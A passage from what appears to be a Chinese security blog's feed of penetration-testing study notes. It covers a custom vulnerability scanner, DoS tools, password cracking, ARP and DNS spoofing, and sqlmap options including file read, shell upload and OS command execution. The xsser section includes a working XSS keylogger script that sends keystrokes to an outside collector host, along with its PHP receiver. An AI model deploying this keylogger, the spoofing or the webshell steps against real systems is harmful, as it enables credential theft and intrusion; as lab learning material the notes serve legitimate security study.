<li><code>txt</code>这个目录是我在编写插件的时候，用到的一些txt，点进去就能看明白了</li>
<li><code>Ploic</code>这个文件夹是我们生成的策略文件</li>
</ol>
<p>了解这么多之后我们就可以来配置我们的策略了，进入程序之后我们就可以看到下面的界面。<br><img src="img3.jpg" alt="mainDialog"><br>可以看到左上角的策略菜单，我们点击，下面有个子菜单，我们点击新建策略。<br><img src="img4.jpg" alt="NewPloic"><br>可以看到左边是搜索引擎的插件，右边是漏洞扫描的插件。<br>当然这里需要注意的是Google插件是需要翻墙的，我没有提供代理，所以你只能使用全局代理（PAC的就可以），所以我这里拿百度的插件进行演示。<br>把百度的钩给勾选上，然后双击百度那一行，然后会弹出一个对话框，我们输入我们想要使用的搜索语句，例如：<code>inurl:asp?id=33</code>这类的语句。然后点击确定就好了。然后起始页和结束页自己选择就好了，然后选择漏洞扫描插件，这里我只写了三个，SQL注入，XPATH注入，XSS注入的。使用的前后缀在txt目录下你们可以看到。<br>我们生成一个策略之后，我们就可以使用我们生成的策略。<br><img src="img5.jpg" alt="result"><br>可以观察到，有点慢，因为我们在txt中的前后缀很多，所以我建议大家可以自己去修改。</p>
<h1 id="开发插件"><a href="#开发插件" class="headerlink" title="开发插件"></a>开发插件</h1><ol>
<li>搜索引擎插件</li>
</ol>
<p>使用MFC的DLL去编写插件：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">BOOL <span class="title">GetLink</span><span class="params">(CString SearchValue,<span class="keyword">int</span> page,CStringArray *ResultLink)</span></span></span><br></pre></td></tr></table></figure>
<p>在你的DLL中导出一个这个名字的函数，第一个参数，是搜索的内容，第二个参数是搜索的页数，第三个参数是返回的数组。</p>
<ol start="2">
<li>漏洞检测插件</li>
</ol>
<p>首先我们需要定义一个结构体：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">URLStruct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	DWORD HTTPFlag;</span><br><span class="line">	CString Domain;</span><br><span class="line">	CString path;</span><br><span class="line">	CMap&lt;CString,LPCTSTR,CString,LPCTSTR&gt; arg;</span><br><span class="line">	INTERNET_PORT PORT;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>导入一个头文件：<br><code>#include &lt;afxinet.h&gt;</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">BOOL <span class="title">ScanVlun</span><span class="params">(URLStruct* Link,CString *Detail)</span></span></span><br></pre></td></tr></table></figure>
<p>在你的DLL中导出一个这个名字的函数，第一个参数就是哪个结构体了，第二参数是详细信息，返回值是是否存在漏洞。</p>
<ol>
<li>HTTPFlag这个是网站链接的类型</li>
<li>Domain是域</li>
<li>path是路径</li>
<li>arg是参数的键值对</li>
<li>PORT是使用的端口</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>程序存在的缺陷：</p>
<ol>
<li>我没使用多线程（很快会更新）</li>
<li>界面做的很随便</li>
<li>插件没有超时，所以一个死链接可能会很久才回会过去（这个是检测漏洞的插件我写的时候我没注意）</li>
</ol>
<p>插件我会经常更新（两三天有空就写一个），我会在我的博客进行发布的：<code>https://wker666.github.io/</code><br>这里我需要强调的是：绝对不能做违法的事情，就和条约上写的一样。</p>
<p>下载地址：<br>链接：<code>https://pan.baidu.com/s/1FTZWIMUfkvxtC0dJihvXjw</code><br>提取码：<code>nqnj</code></p>
<p>我为什么不写fofa，shodan，钟馗插件，是因为我怕有人会恶意替换这个插件。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>拒绝服务</title>
    <url>/2020/05/20/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<h2 id="httpslow"><a href="#httpslow" class="headerlink" title="httpslow"></a>httpslow</h2><p>通过发送一个post之类的长数据，一次发送很少的字节，然后让服务器一直等待剩余数据，使得服务器的连接数暴增。<br><code>slowhttptest -c 1000 -H -g -o out.txt -i 10 -r 200 -t GET -u</code><br>需要通过<code>ulimit -n 70000</code>设置Linux最大连接数。<br><img src="img1.jpg" alt="参数"></p>
<h2 id="land"><a href="#land" class="headerlink" title="land"></a>land</h2><p>就是通过伪造源地址为目标地址实现目标地址自己连接自己。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>密码破解</title>
    <url>/2020/05/09/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="常用密码位置"><a href="#常用密码位置" class="headerlink" title="常用密码位置"></a>常用密码位置</h2><p><code>usr/share/wordlists</code>这个下面有许多常用的密码字典文件。</p>
<h2 id="密码字典生成工具"><a href="#密码字典生成工具" class="headerlink" title="密码字典生成工具"></a>密码字典生成工具</h2><p>普通密码字典生成：crunch：<br><code>crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100</code></p>
<ul>
<li>-b 分割文件的大小，这里是MB</li>
<li>-c 每个字典的行数</li>
<li>-o START</li>
<li>-d 同样的字符连贯出现数据（例如是2的话呢，不能连续三个字符一样）</li>
<li>-f 字符集列表：<code>/usr/share/crunch/charset.lst lalpha-sv</code>(其实就是一堆字符集，然后挑选就好了)</li>
<li><img src="img1.jpg" alt="crunch"></li>
<li>前两个6是最大最小位数</li>
<li>-p 指定字符的所有组合（最大最小字符失效）不加-p的话呢也是所有组合，但是有最小最大位数的区分</li>
<li>任何不同于-p参数指定的值都是占位符</li>
<li>-s 指定起始字符串</li>
<li>-q 是将以全文字当作基本字符。-q char.txt</li>
<li>-t 掩码<ul>
<li>掩码类型</li>
<li><img src="img2.jpg" alt="yanma"></li>
</ul>
</li>
<li>-z 是压缩格式，最好是7z，压缩比例比较好</li>
<li><ul>
<li>占位符</li>
</ul>
</li>
<li>\转义符(空格、符号)</li>
</ul>
<h2 id="信息集成生成工具"><a href="#信息集成生成工具" class="headerlink" title="信息集成生成工具"></a>信息集成生成工具</h2><ol>
<li>cupp(主要用来破解个人账号)<ol>
<li>使用的话呢先安装<code>git clone https://github.com/Mebus/cupp.git</code></li>
<li>-i参数指定为交互的方式进行信息输入（一般就这个参数，其他的没啥用处）</li>
<li>注意的是，自带的那个Python版本不太行我们需要使用<code>Python3 cupp.py -i</code></li>
</ol>
</li>
<li>cewl 通过手机网站信息生成字典<ol>
<li>-m 最小单词长度</li>
<li>-d 爬网深度</li>
<li>-e 收集email</li>
<li>-c 每个单词出现的次数</li>
<li>-w 输出文件</li>
<li><code>cewl www.baidu.com -m 3 -d 3 -e -c -v -w cewlout.txt</code></li>
</ol>
</li>
<li>John<ol>
<li>首先在/etc/john/john.conf中配置自己所需的规则</li>
<li><code>john --wordlist=p.lst --rules=guize --stdout &gt; m.txt</code></li>
</ol>
</li>
<li>pw-inspector 筛选字典<ol>
<li>-i 输入文件</li>
<li>-o 输出文件</li>
<li>-u 大写字母</li>
<li>-l 小写字母</li>
<li>-m 最小位数</li>
<li>-M 最大位数</li>
</ol>
</li>
</ol>
<h2 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h2><ol>
<li>hydra<ol>
<li>-l 指定用户名（大写是文件）</li>
<li>-P 指定密码文件</li>
<li><code>hydra -l admin -P /usr/share/wordlists/dirb/small.txt ftp://192.168.126.1</code></li>
<li><img src="img3.jpg" alt="ftp"></li>
<li>-vV 详细信息</li>
<li>-t 指定并发数</li>
<li>-e nsr 检查空密码</li>
<li>-s 检查账号密码相同</li>
</ol>
</li>
<li>medusa<ol>
<li>相对与hydra稳定性好一些，但支持的服务比较少</li>
<li>-M 指定模块</li>
<li>-d 查看支持的模块</li>
<li>-e 和hydra一样</li>
<li>-u 用户名</li>
<li>-P 密码列表</li>
<li><code>medusa -h 192.168.126.1 -F -e ns -u admin -P /usr/share/wordlists/dirb/small.txt -M ftp</code></li>
<li>-n 非默认端口</li>
<li>-T 并发主机数目</li>
<li><code>-M ftp -q</code>查看ftp下面的小参数</li>
</ol>
</li>
</ol>
<h2 id="hash猜测"><a href="#hash猜测" class="headerlink" title="hash猜测"></a>hash猜测</h2><p>判断hash类型。</p>
<ol>
<li><code>hash-identifier</code><ol>
<li>直接输入我们需要的hash值</li>
</ol>
</li>
</ol>
<h2 id="hash破解"><a href="#hash破解" class="headerlink" title="hash破解"></a>hash破解</h2><ol>
<li><code>hashcat</code><ol>
<li>-m Hash值的类型的编号</li>
<li>指定破解的hash文件（里面存放着hash值）</li>
<li>破解的密码本</li>
<li>-a 六种模式<ol>
<li>0 字典破解</li>
<li>1 排列组合字典密码本破解</li>
<li>2 尝试字典中的额所有大写小写的组合</li>
<li>3 全字符集（比较傻逼）</li>
<li>4 密码换位置破解</li>
<li>5 自动生成掩码</li>
</ol>
</li>
<li>-b 查看当前系统的强度（我的不知道为啥破解不出来）</li>
<li>我这个不知道为啥不能用，提示我没内存…</li>
</ol>
</li>
</ol>
<h2 id="彩虹表生成"><a href="#彩虹表生成" class="headerlink" title="彩虹表生成"></a>彩虹表生成</h2><ol>
<li><code>rtgen</code><ol>
<li>生成彩虹表（没啥必要）</li>
</ol>
</li>
<li><code>rtsort</code><ol>
<li>跟随生成的彩虹表进行排序</li>
</ol>
</li>
<li><code>rcrack</code><ol>
<li><code>rcrack *.rt -h xxxxx</code></li>
</ol>
</li>
</ol>
<ul>
<li><code>Ophcrack</code><ul>
<li>界面化的工具</li>
</ul>
</li>
</ul>
<h2 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h2><ol>
<li>john<ol>
<li>限制性single模式（通过账号信息）</li>
<li>wordlist（通过字典）有默认的</li>
<li>全部密码破解</li>
<li>破解Linux系统账号</li>
<li><code>unshadow /etc/passwd .etc/shadow &gt; pass.txt</code>（其实就是输出合并文件密码的那两个文件）</li>
<li>会自动判断加密算法</li>
<li>查看密码内容<code>john --show pass.txt</code></li>
<li>结果日志之类的存放在john目录下的pot和log里面</li>
<li>破解Windows下的密码：<code>john sam.dump --wordlist=password.lst --format=nt</code></li>
</ol>
</li>
</ol>
<h2 id="在线密码"><a href="#在线密码" class="headerlink" title="在线密码"></a>在线密码</h2><p>cmd5挺好用的</p>
<h2 id="手动进行ARP欺骗"><a href="#手动进行ARP欺骗" class="headerlink" title="手动进行ARP欺骗"></a>手动进行ARP欺骗</h2><p>首先我们需要让我们的虚拟机是桥接模式。<br>然后我们清空一下ARP的缓存。<br>用管理员方式打开CMD使用命令：<code>arp -d</code><br>然后我们需要先获取一下网关的MAC地址，ping一下网关的IP，然后再ping一下目标的IP。<br>最后使用<code>arp -a</code>查看网关和目标的MAC。<br><img src="img5.jpg" alt="mac"><br>获取到之后，我们使用OmniPeek抓取来自网关的ARP响应包数据。<br><img src="img6.jpg" alt="arp响应包"><br>然后我们选择发送栏目下的<code>发送选中的数据包</code>，然后点击编辑数据包。<br><img src="img7.jpg" alt="pack"><br>修改Destination和Source这两个mac，将目的改为目标的mac，来源来为我们的mac。<br>使用<code>ipconfig /all</code>查看我们的mac。<br>将Target Hardware Addr改为目标的mac，将Target Initernet Addr改为目标的IP。<br>上面那张图是我改完之后的。<br>我们点击发送。<br>然后调出发送窗口，然后开始发送，就会一直发送欺骗的ARP数据包。<br><img src="img8.jpg" alt="send"><br>然后我们在目标及其中观察。<br><img src="img9.jpg" alt="res"><br>发现目标网关的mac已经变成了我们的mac，目标ping一下网关。，我们抓包可以看到：<br><img src="img10.jpg" alt="ping"><br>可以看到我们已经成功欺骗了。超时是因为我们没有响应她。</p>
<h2 id="工具ARP劫持"><a href="#工具ARP劫持" class="headerlink" title="工具ARP劫持"></a>工具ARP劫持</h2><ol>
<li><code>arpspoof -t 192.168.209.130 -r 192.168.209</code>双向欺骗</li>
<li><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code>开启路由转发（默认是0）</li>
<li>这样子就实现了完全的劫持，然后就直接使用抓包工具进行抓包就好了。</li>
<li>抓取URL：<code>webspy -i eth0 192.168.209.130</code>或者<code>urlsnarf -i eth0</code></li>
<li>嗅探密码：<code>dsniff -i eth0 -m</code></li>
<li>dns欺骗：<code>dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts</code>（需要先修改里面的host，添加就好）</li>
</ol>
<h2 id="工具DNS欺骗"><a href="#工具DNS欺骗" class="headerlink" title="工具DNS欺骗"></a>工具DNS欺骗</h2><p>首先我们需要能够修改目标的DNS服务器，然后我们就可以劫持了。<br>使用命令：<code>dnschef --fakeip=127.0.0.1 --fakedomains=www.baidu.com,www.sina.com --interface 192.168.209.131 -q</code><br>第一个IP是指向的IP，第二个是网卡的IP。<br>修改host。<br><img src="img11.jpg" alt="DNS"></p>
<p><img src="img12.jpg" alt="res"></p>
<h2 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h2><p>欺骗方式：</p>
<ol>
<li>arp</li>
<li>icmp</li>
<li>dhcp</li>
<li>静像端口转发</li>
<li>IPV6</li>
<li>request包投毒</li>
<li>ICMP更新ARP</li>
</ol>
<p>可以将ettercap改为root下面运行在<code>etter.conf</code>中修改UID和GID为0（默认是nobody权限）</p>
<p>修改<code>etc/ettercap/etter.conf</code><br><img src="img13.jpg" alt="ssl"><br>将#去掉可以捕获https。</p>
<p>修改<code>etc/ettercap/etter.dns</code>实现dns欺骗</p>
<p>编译筛选器<br><code>etterfilter etter.filter.ssh -o ssh.ef</code></p>
<h2 id="passhash"><a href="#passhash" class="headerlink" title="passhash"></a>passhash</h2><p>就是通过加密的密码进行提交登录密码。</p>
<p><img src="img14.jpg" alt="passhash"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB渗透</title>
    <url>/2020/04/28/WEB%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h2 id="页面克隆"><a href="#页面克隆" class="headerlink" title="页面克隆"></a>页面克隆</h2><p>使用httrack这个工具可以进行克隆</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# httrack</span><br><span class="line"></span><br><span class="line">Welcome to HTTrack Website Copier (Offline Browser) 3.49-2</span><br><span class="line">Copyright (C) 1998-2017 Xavier Roche and other contributors</span><br><span class="line">To see the option list, enter a blank line or try httrack --help</span><br><span class="line"></span><br><span class="line">Enter project name :test</span><br><span class="line"></span><br><span class="line">Base path (return&#x3D;&#x2F;root&#x2F;websites&#x2F;) :&#x2F;root&#x2F;桌面&#x2F;test        </span><br><span class="line"></span><br><span class="line">Enter URLs (separated by commas or blank spaces) :http:&#x2F;&#x2F;www.zrrg.com&#x2F;</span><br><span class="line"></span><br><span class="line">Action:</span><br><span class="line">(enter)	1	Mirror Web Site(s)</span><br><span class="line">	2	Mirror Web Site(s) with Wizard</span><br><span class="line">	3	Just Get Files Indicated</span><br><span class="line">	4	Mirror ALL links in URLs (Multiple Mirror)</span><br><span class="line">	5	Test Links In URLs (Bookmark Test)</span><br><span class="line">	0	Quit</span><br><span class="line">: 2</span><br><span class="line"></span><br><span class="line">Proxy (return&#x3D;none) :</span><br><span class="line"></span><br><span class="line">You can define wildcards, like: -*.gif +www.*.com&#x2F;*.zip -*img_*.zip</span><br><span class="line">Wildcards (return&#x3D;none) :*</span><br><span class="line"></span><br><span class="line">You can define additional options, such as recurse level (-r&lt;number&gt;), separated by blank spaces</span><br><span class="line">To see the option list, type help</span><br><span class="line">Additional options (return&#x3D;none) :</span><br><span class="line"></span><br><span class="line">---&gt; Wizard command line: httrack http:&#x2F;&#x2F;www.zrrg.com&#x2F; -W -O &quot;&#x2F;root&#x2F;桌面&#x2F;test&#x2F;test&quot;  -%v  *</span><br><span class="line"></span><br><span class="line">Ready to launch the mirror? (Y&#x2F;n) :Y</span><br><span class="line"></span><br><span class="line">WARNING! You are running this program as root!</span><br><span class="line">It might be a good idea to run as a different user</span><br><span class="line">Mirror launched on Tue, 28 Apr 2020 22:04:52 by HTTrack Website Copier&#x2F;3.49-2 [XR&amp;CO&#39;2014]</span><br><span class="line">mirroring http:&#x2F;&#x2F;www.zrrg.com&#x2F; * with the wizard help..</span><br></pre></td></tr></table></figure>
<p>很简单，就是跟着向导进行设置，拷贝出来文件的目录。<br>还是对我们的目录探索有一定的帮助的。</p>
<h2 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h2><p>基本语法：<code>nikto -host http://www.XXXX.com</code></p>
<ul>
<li>-ssl 指定使用HTTPS</li>
<li>-evasion：使用躲避技术，可以用1-8个状态进行指定，类似-evasion 167</li>
</ul>
<p>还有许多交互的键。<br>v详细信息，空格是查看当前状态。</p>
<p>修改配置文件：<code>vi /etc/nikto.conf</code><br>可以修改UA</p>
<p>这个程序主要是检测服务器程序的漏洞的，比如说IIS之类的。</p>
<h2 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h2><p>使用命令：<code>skipfish -o skipfish http://www.baidu.com</code></p>
<ol>
<li>-I 指定路径中包含的字符串：-I github</li>
<li>使用@指定一个txt文件</li>
<li>-S 指定一个需要检测的额外的隐藏目录，skipfish自带了好多wl后缀的文件，这些就是可能是隐藏的文件。</li>
<li>-W 就是可能在检测的时候我们获得一些隐藏目录，我们指定一个文件将其保存</li>
<li>-X 存在指定字符串就不进行测试</li>
<li>-K 对某个参数不进行测试</li>
<li>-D 多指定一个域名（需要扫描网站中存在，存在的话呢我们就会对其进行扫描）</li>
<li>-L 每秒并发个数</li>
<li>-m IP扫描的并发数</li>
<li>-C 附带cookie信息，-C “name=wker”</li>
</ol>
<p><img src="img1.jpg" alt="skipfish"></p>
<p>感觉这个小工具很一般，虽然是谷歌的。</p>
<h2 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h2><p>个人感觉这个小工具牛逼一些。<br>很烦的是新版本的kali已经不自带了，安装很麻烦，并且我现在的git克隆到10%就RPC中断，等我换个网吧，所以现在勉强用老版本的吧。<br>使用<code>help</code>查看使用方法。<br><code>plugins</code>进入插件目录：<br><img src="img2.jpg" alt="plugins"><br>使用<code>list</code>进行查看，<code>list audit</code>查看检测模块。<br>然后使用类似：<code>audit all</code>,<code>audit xss</code>选择我们要使用的插件。<br>一般使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">audit all</span><br><span class="line">grep all</span><br><span class="line">crawl web_spider</span><br></pre></td></tr></table></figure>
<p>w3af自带了许多配置好了的。<br>使用profiles进行查看，list查看已有的。<br>当然我们选择好我们自己的配置好了的之后，我们使用save_as进行保存。<code>save_as test</code><br>我们下次用的时候，我们只需要<code>use</code>就可以了。<br>设置http的一些信息，<code>http-settings</code>设置我们的一些全局信息。<br>使用<code>view</code>查看我们可以配置的。<br>一些信息都是比较简单的，例如：<code>set rand_user_agent True</code><br>使用<code>save</code>进行保存。<br>进入<code>target</code>命令，使用<code>set target http://192.168.209.130</code>设置我们要扫描的目标站点。</p>
<p>使用<code>save_as test1</code>最后一次保存。</p>
<p>-s参数可以执行w3af的脚本。</p>
<p>身份验证：</p>
<ol>
<li>如果有HTTP验证的话呢我们需要加上，其实也就是在协议头有个base64的一个编码。</li>
<li>NTLM身份验证，Windows集成身份认证，其实也就是对一个随机数加密，然后回传，进行比对。</li>
<li>表单的身份验证，就是设置一下表单的信息，但是需要注意的是，不要带着cookie去访问logout这种的退出网页。</li>
<li>cookie就是随着访问发送的cookie，w3af需要用到的是一个cookie文件，导出的cookie文件，在config导入。<ul>
<li><img src="img3.jpg" alt="cookies设置"></li>
<li>第二个的意思是代表是否是整个域都可以访问这个cookie，我们一般需要设置为TRUE，第四个是代表是否是安全链接的时候才会传输，一般是FALSE</li>
</ul>
</li>
</ol>
<p>w3af也支持代理。<br><img src="img4.jpg" alt="代理"></p>
<p>在配置中可以设置头文件。<br>截断代理爬网也是比较有意思的。</p>
<p>目录的话呢还是可以导入的。</p>
<p>当然支持漏洞的利用，将利用的工具（w3af左边栏上的）拖动到漏洞上就可以了。</p>
<h2 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a>OWASP_ZAP</h2><p>起始的页面对话框问你是否要保存回话（也就是操作得到的结果）<br>支持代理的爬站。<br>支持FUZZ测试。<br>可以选择扫描的类型（安全，保护，默认，危险）<br><img src="img5.jpg" alt="mode"><br>可以设置session在session标签下面。</p>
<p>支持截断修改数据。<br>支持对隐藏表单的显示。</p>
<h2 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h2><ol>
<li>可以讲不支持代理的程序进行代理，需要在代理那里设置invisible<br>抓到数据包之后，我们在历史里面点击我们需要修改的CSRF数据包，然后右击选择Engagement tools，然后选择CSRF，就可以生成一个表单了。</li>
</ol>
<p><img src="img6.jpg" alt="CSRF"></p>
<p>有点多，不记录了，之前用的有点多了，也比较熟悉了。</p>
<h2 id="SQlmap"><a href="#SQlmap" class="headerlink" title="SQlmap"></a>SQlmap</h2><ol>
<li>-u 参数指定一个URL进行检测</li>
<li>-p 参数检查指定参数</li>
<li>–users 参数查询数据库的账号密码</li>
<li>–banner 查看banner信息</li>
<li>–dbs 查看数据库</li>
<li>-a 参数查询所有东西</li>
<li>-schema 查询数据库的结构</li>
<li>-m 参数对文件列表中的URL进行扫描</li>
<li>-r 参数对POST之类的方法进行检测</li>
<li>-l 参数对burp的log文件进行扫描</li>
<li>–force=ssl 对HTTPS进行检测</li>
<li>-c 扫描配置文件</li>
<li>–data= 指定提交的参数</li>
<li>–param-del 指定参数分隔符</li>
<li>–cookie 指定参数（需要level&gt;=2的时候才会检查cookie）</li>
<li>–level 2 指定等级</li>
<li>–random-agent 随机UA</li>
<li>–user-agent 指定UA</li>
<li>UA中的漏洞需要level等级大于3</li>
<li>host头中的注入需要等级大于5</li>
<li>–referer 指定来源，等级大于3才能检测</li>
<li>–header 指定HTTP的一些键值（大小写敏感）</li>
<li>–method=GET/POST 指定提交的参数</li>
<li><code>--proxy=&quot;http://127.0.0.1:8080&quot;</code> 使用代理</li>
<li>–ignore-proxy 忽略操作系统代理</li>
<li>–delay 每次之后的延迟</li>
<li>–timeout 超时时间</li>
<li>–retries 超时重试次数</li>
<li>–randomize 指定每次请求随机取值的参数值</li>
<li>–scope 通过正则表达式筛选扫描对象（有的时候URL比较多，burp的log类似的）</li>
<li>–safe-url / –safe-freq 按时发几个正常的请求</li>
<li>–skip-urlencode 参数不进行URL编码</li>
<li>–eval 执行指定的Python脚本在每次提交数据之前（主要用来对某个参数进行计算的）</li>
<li>–predict-output 指定使用猜测模糊方式加快性能（根据特征表段字段）</li>
<li>–keep-alive 使用长连接（其实就是HTTP是每次访问是独立的，每次都要连接，然而长连接就一次连接就可以了，与proxy参数不兼容）</li>
<li>–null-connection 空连接（使用文件内容大小进行判断，适用于盲注）</li>
<li>-o 参数是上面三个参数的集合</li>
<li>–text-only 通过关键字进行判断页面是否正常（与上面的不兼容）</li>
<li>–threads 指定并发数</li>
<li>–skip 排除指定的扫描参数</li>
<li>–dbms 指定数据库类型</li>
<li>–os 指定操作系统</li>
<li>–incaild-bignum / –invalid-logical 将参数进行无效化，默认是取负数，前面的是巨大的值，后面的是用AND进行无效（其实就是让前面查询失败，只显示后面的查询结果）</li>
<li>–no-cast 将结果转换为字符串，并用刻个替换NULL结果（针对老版本mysql）</li>
<li>–no-escape 关闭ASCII编码逃逸（就是不用ASCII代理原字符）</li>
<li>–prefix 指定前缀</li>
<li>–suffix 指定后缀</li>
<li>–tamper 混淆脚本，例如（–tamper=”randomcase.py,hex2char.py”）</li>
<li>–risk 指定危险等级</li>
<li>–string / –not-string 指定字符串存在不存在判断为真 –regexp 使用正则 –code 使用响应码 –text-only 指定字符 –titles 指定标题</li>
<li>–time-sec 指定时间盲注的时间</li>
<li>–union-cols 指定查询的列</li>
<li>–union-char 指定联合查询的空字符</li>
<li>–second-order 指定结果显示的页面（配合二次注入）</li>
<li>-f 数据库版本</li>
<li>-b banner信息</li>
<li>在特殊的位置进行注入用*代替（伪静态）</li>
<li>–dbs 查看当前数据库的账号（-D）</li>
<li>–current-xxx 查看当前的XXX</li>
<li>–privileges -U xxx 查看数据库的权限</li>
<li>–roles 查看角色</li>
<li>–tables 查看表（-T）–exclude-sysdbs（排除系统的系统）</li>
<li>–columns 查看字段（-C）</li>
<li>–count 查看记录数目</li>
<li>–schema 查看数据库的表结构</li>
<li>–batch 选项使用默认的选项</li>
<li>-v 显示详细程度的级别</li>
<li>–start –stop 指定其实和结束的位置</li>
<li>–sql-query “select from xxx” 执行SQL语句</li>
<li>–common-tables 暴力破解表</li>
<li>–common-colums 暴力破解列</li>
<li>–file-read=”etc/passwd” 读文件（UDF）</li>
<li>–file-write=”shell.php” –file-dest=”/tmp/shell.php” 上传shell.php到目标的/ymp下面的shell.php</li>
<li>–os-cmd id 执行操作系统的命令</li>
<li>–sql-shell 获取SQL的shell</li>
<li>–reg-read/add/del（读取/添加/删除）注册表（需要指定键值…等信息<code>--reg-key</code>）</li>
<li>–charset 指定编码 –charset=GBK</li>
<li>–flush-session 清除之前保存的缓存</li>
<li>–fresh-queries 忽略缓存</li>
<li>–hex 使用十六进制进行传输数据</li>
<li>–check-waf 检查WAF</li>
<li>-hpp 绕过部分的保护（通过?x=1&amp;y=1&amp;x=1）这个样子绕过（asp多一些）</li>
<li>–identify-waf 检查waf比较彻底</li>
</ol>
<h2 id="xsser"><a href="#xsser" class="headerlink" title="xsser"></a>xsser</h2><p>有个坑，就是说你需要将测试的参数的值改为XSS</p>
<ul>
<li>-s 统计信息</li>
<li>-v 详细信息</li>
<li>–reverse-check 提交一个js，这个js可以连接xsser，如果xsser接收到连接表明有xss</li>
<li>–heuristic 查看过滤的的字符<br>编码参数：</li>
<li>–Str               Use method String.FromCharCode()</li>
<li>–Une               Use Unescape() function</li>
<li>–Mix               Mix String.FromCharCode() and Unescape()</li>
<li>–Dec               Use Decimal encoding</li>
<li>–Hex               Use Hexadecimal encoding</li>
<li>–Hes               Use Hexadecimal encoding with semicolons</li>
<li>–Dwo               Encode IP addresses with DWORD</li>
<li>–Doo               Encode IP addresses with Octal</li>
<li>–Cem=CEM           Set different ‘Character Encoding Mutations’<br>注入位置：</li>
<li>–Coo               COO - Cross Site Scripting Cookie injection</li>
<li>–Xsa               XSA - Cross Site Agent Scripting</li>
<li>–Xsr               XSR - Cross Site Referer Scripting</li>
<li>–Dcp               DCP - Data Control Protocol injections</li>
<li>–Dom               DOM - Document Object Model injections</li>
<li>–Ind               IND - HTTP Response Splitting Induced code</li>
</ul>
<p>用onClick类型的可以绕过一些</p>
<p>xss键盘记录器：<br>js代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">    evt = evt || <span class="built_in">window</span>.event</span><br><span class="line">    key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</span><br><span class="line">    <span class="keyword">if</span> (key) &#123;</span><br><span class="line">        <span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        <span class="keyword">var</span> param = <span class="built_in">encodeURI</span>(key)</span><br><span class="line">        http.open(<span class="string">"POST"</span>,<span class="string">"http://192.168.209.1:8080/keylogger.php"</span>,<span class="literal">true</span>);</span><br><span class="line">        http.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">        http.send(<span class="string">"key="</span>+param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = $_POST[<span class="string">'key'</span>];</span><br><span class="line">$log = fopen(<span class="string">"keylog.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($log,$key);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>再生成一个<code>keylog.txt</code>，当别人加载js的时候我们就会接收到他的输入，放在<code>keylog.txt</code>里面。</p>
<h2 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a>BEEF</h2><p>启动就好，监听3000端口<br>指定的就是3000下的hook.js<br>自动监听操作，查看浏览器的版本信息。<br>Persistence类型是用来持久维护shell的，尽量来了shell就用一下。</p>
<p>暂时记录这么多，之后再记录。</p>
<h2 id="WEBSHELL"><a href="#WEBSHELL" class="headerlink" title="WEBSHELL"></a>WEBSHELL</h2><p>WeBaCoo将数据的传输放在了cookie里面。</p>
<ul>
<li>生成木马<code>webacoo -g -o webacoo.php</code></li>
</ul>
<p>生成类似的编码（就是套了个壳子，免杀的性质）</p>
